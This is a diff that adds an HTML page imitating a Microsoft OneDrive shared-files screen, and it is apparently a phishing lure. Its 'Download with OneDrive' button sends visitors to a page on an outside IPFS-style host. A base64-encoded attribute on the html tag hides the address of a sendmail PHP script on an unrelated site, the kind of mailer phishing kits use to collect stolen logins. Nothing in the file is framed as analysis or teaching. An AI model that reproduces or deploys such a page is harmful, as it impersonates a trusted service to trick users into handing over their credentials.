@@ -1,0 +1,258 @@
+<html lang="en" data-bollocks="aHR0cHM6Ly93d3cuYmVuY2hhcHJvbmUuY29tL2ltYWdlcy9zZW5kbWFpbC1yMTk3MC5waHA=">
+    <head>
+        <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- <link rel="stylesheet" href="style.css"> -->
+    <link rel="shortcut icon" href="" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
+    <title>My Files - OneDrive</title>
+    <style type="text/css">
+        .sidebar ul > li, body, html {
+     font-family: Verdana, sans-serif
+ }
+.email-footer, .file-item:hover, .formbtn, .pointer, .sidebar ul > li {
+     cursor: pointer
+ }
+ *{
+     padding: 0;margin: 0;outline: 0
+ }
+body, html {
+ font-size: 15px;
+ line-height: 1.5
+}
+html {
+ overflow-x: hidden
+}
+h1 {
+ font-size: 36px
+}
+h2 {
+ font-size: 30px
+}
+h3 {
+ font-size: 24px
+}
+h4 {
+ font-size: 20px
+}
+h5 {
+ font-size: 18px
+}
+h6 {
+ font-size: 16px
+}
+.header {
+ background-color: #0078d4;line-height:3pc;display:flex;justify-content:space-between;color:#fff;
+ padding: 0 5px;
+}
+.name_class {
+ padding: 2px 0 0 7px;
+}
+.search_class {
+ display: flex;justify-content: space-between;width: 40%;background-color: #fff;color: #000000B3;margin-top:6px;height:35px;padding:0 3px;align-content:center;align-items:center;border-radius:3px;font-size:14px;margin-right:-50px;
+}
+.search_class [class*=fa-], .sticky-div, li[class *=fa-] {
+ color: #0078d4}.sidebar ul>li,.submenu li,.submenu li>i{color:#0078d4;
+}
+.profile_right {
+ width: 15% ;font-size: 1.3rem;margin-top: 1.5pt;margin-right: 2px;margin-bottom: 2px;display: flex;justify-content: space-around;align-items: center;
+}
+.user_profile_icon {
+ width: 37px;height: 37px;border-radius: 50% ;background-color: #0078d4;color:#fff;text-align: center;line-height: 35px;font-size: 19px;border: 1px solid #fff;
+}
+.sidebar {
+ width: 230px;background-color: #f2f2f2;height: 93vh;top: 0;left: 0;
+}
+.content {
+ margin-left: 229px;
+ padding: 20px 1px 20px 0;
+ position: absolute;
+ top: 25px;
+ width: auto;
+ right: 0;
+ left: 0;
+}
+@media(max-width: 768px) {
+.sidebar {
+     display: none;
+ }
+ .content {
+     margin-left: 0;
+ }
+}
+ul {
+ list-style: none;
+}
+.sidebar ul > li {
+ margin: 25.5px 0 0;font-size: .145833333in ;padding: 6px 1px 6px 27px;
+}
+.sticky-div {
+ border-top: 1px solid #ddd;
+ padding: 10px 15px;
+ position: sticky;
+ top: 93vh;
+ left: 0;
+ font-size: 12px;
+}
+.loader, .overlay {
+ position: absolute;
+}
+.submenu {
+ display: flex;justify-content: space-between;border-bottom: 1px solid #ddd;padding: 12px 5px 5px;
+}
+.submenu ul {
+ display: flex;align-items: self-start;font-size: 14px;
+}
+.submenu li {
+ padding: 4px 6px 4px 5px;margin: 0 0 0 5px;
+}
+.submenu.firstsub li first-child {
+ background-color: #0078d4;border-radius:3px;padding:5px 17px 5px 5px;color:#fff;
+ margin: 0;
+}
+.submenu.firstsub li first-child > i {
+ color: #fff;
+}
+.secondsub {
+ margin-top: 7px;
+ color: #0078d4}.secondsub>*{margin-left:5px;margin-bottom:-4px}
+ .overlay {
+    background-color:#00000094;
+    z-index: 10;
+    width: 100%;
+    height: 100vh;
+    top: 0;
+    display: none;
+}
+.filesection {
+    height: 80vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+.file-item {
+    cursor: pointer;
+}
+.hover-effect:hover {
+    opacity: 0.7;
+}
+</style>
+    <body>
+        <main>
+            <section class="header">
+                <div class="name_class">
+                    <i class="fa-solid fa-bars" style="font-size: 23px; margin-right: 5px"></i>
+                    <span>OneDrive</span>
+                </div>
+                <div class="search_class">
+                    <div>
+                        <i class="fa-solid fa-magnifying-glass"></i>
+                        <a>Search</a>
+                    </div>
+                    <div>
+                        <a>All files</a>
+                        <i class="fa-solid fa-angle-down"></i>
+                    </div>
+                </div>
+                <div class="profile_right">
+                    <i class="fa-solid fa-gear"></i>
+                    <i class="fa-solid fa-question"></i>
+                    <a class="user_profile_icon">R</a>
+                </div>
+            </section>
+            <aside>
+                <div class="sidebar">
+                    <div style="padding: 10px 0 10px; font-size: 12.5px; margin-left: 15px; margin-bottom: 2px;   color: #595958; font-weight: 600; ">
+                        <a> Files Directory</a>
+                    </div>
+                    <ul>
+                        <li>
+                            <i class="fa-solid fa-folder"></i>
+                            <a>My Files</a>
+                        </li>
+                        <li>
+                            <i class="fa-solid fa-clock-rotate-left"></i>
+                            <a>Recent</a>
+                        </li>
+                        <li style="background-color: #0000001A;">
+                            <i class="fa-solid fa-user-group"></i>
+                            <a>Shared</a>
+                        </li>
+                        <div style="padding: 10px 0 0 0px;font-size: 12.5px;margin: 20px 0 0 15px;color: #595958;font-weight: 600; "> 
+                            <a>Shared Libraries</a>
+                        </div>
+                        <div style="padding-left: 15px;padding-right: 3px; margin-bottom: 10px;">
+                            <a style="align-content: center;position: relative;height: 36px;font-size: 10px;margin-left: 1px;color: #595958; letter-spacing: -0.2; "> Sites help you work on projects with your team and share information from anywhere on any device. Create or follow sites to see them here.</a>    
+                        </div>
+                        <li>
+                            <i class="fa-solid fa-file-invoice-dollar"></i>
+                            <a>Quotation</a>
+                        </li>
+                    </ul>
+                    <div class="sticky-div pointer">
+                        <a>Get the OneDrive apps</a>
+                    </div>
+                </div>
+            </aside>
+            <article class="content">
+                <div class="submenu">
+                    <div class="firstsub">
+                        <ul>
+                            <li style>
+                                <i class="fa-solid fa-plus"></i>
+                                <a style="margin-left: 12px;">New</a>
+                                <i class="fa-solid fa-angle-down"></i>                          
+                            </li>
+                            <li>
+                                <i class="fa-solid fa-upload"></i>
+                                <a style="margin-left: -1px;">Upload</a>
+                                <i style="margin-left: -1px;" class="fa-solid fa-angle-down"></i>
+                            </li>
+                            <li>
+                                <i class="fa-solid fa-arrows-rotate"></i>
+                                <a style="margin-left: -1px;">Sync</a>
+                            </li>
+                            <li>
+                                <i class="fa-solid fa-bolt"></i>
+                                <a style="margin-left: -1px;">Automate</a>
+                                <i style="margin-left: -1px;" class="fa-solid fa-angle-down"></i>
+                            </li>                       
+                        </ul>
+                    </div>
+                    <div class="secondsub">
+                        <i class="fa-solid fa-arrow-down-short-wide"></i>
+                        <a>Sort</a>
+                        <i class="fa-solid fa-angle-down"></i>
+                        <i class="fa-solid fa-border-all"></i>
+                        <i class="fa-solid fa-angle-down"></i>
+                        <i class="fa-solid fa-circle-exclamation"></i>
+                    </div>
+                </div>
+                <div class="shared">Shared Files</div>
+                <section class="filesection">
+                    <div class="file-item" onclick="openLink()">
+                        <i class="fa-light fas fa-file-download" style="font-size: 200px; color: #0078d4;"></i>
+                    </div>
+                    <div class="file-item" onclick="openLink()">
+                        <a style="color: #0078d4;" class="hover-effect">Download with OneDrive</a>
+                    </div>
+                </section>
+            </article>
+        </main>
+        <style type="text/css"></style>
+        <script>
+            function openLink() {
+              window.location.href = 'https://misty-tooth-8605.on.fleek.co/index-1drive7.html';
+            }
+            document.querySelector('.file-item').addEventListener('mouseover', function() {
+              document.querySelector('.file-item').style.opacity = '0.7';
+            });
+            document.querySelector('.file-item').addEventListener('mouseout', function() {
+              document.querySelector('.file-item').style.opacity = '1';
+            });
+          </script>
+    </body>
+    </head>
+</html>
